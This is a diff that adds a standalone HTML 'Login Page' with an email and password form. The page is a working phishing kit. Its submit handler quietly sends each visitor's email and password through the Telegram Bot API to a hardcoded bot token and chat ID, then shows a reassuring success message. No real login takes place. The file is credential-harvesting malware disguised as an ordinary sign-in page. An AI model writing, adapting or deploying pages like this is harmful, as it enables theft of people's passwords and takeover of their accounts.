@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Login Page</title>
+</head>
+<body>
+	<div style="padding: 20px;">
+		<h1>Login</h1>
+		<form onsubmit="submitForm(event)">
+			<label for="email">Email</label><br>
+			<input type="email" id="email" name="email" required><br><br>
+
+			<label for="password">Password</label><br>
+			<input type="password" id="password" name="password" required><br><br>
+
+			<input type="submit" value="Submit">
+		</form>
+	</div>
+
+	<script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+	<script>
+		function submitForm(event) {
+			event.preventDefault();
+			const formData = new FormData(event.target);
+			const email = formData.get('email');
+			const password = formData.get('password');
+
+			const message = `Email: Email: ${email}%0APassword: ${password}`;
+			const url = `https://api.telegram.org/bot5313824526:AAEI3MgZNSxfGmExZCB8srsgh_4c_gC6sDc/sendMessage?chat_id=2040461515&text=${message}`;
+
+			axios.post(url)
+.then(response => {
+					console.log(response.data);
+					alert('Your login data has been submitted successfully!');
+				})
+				.catch(error => {
+					console.error(error);
+					alert('Oops! Something went wrong. Please try again later.');
+				});
+		}
+	</script>
+</body>
+</html>
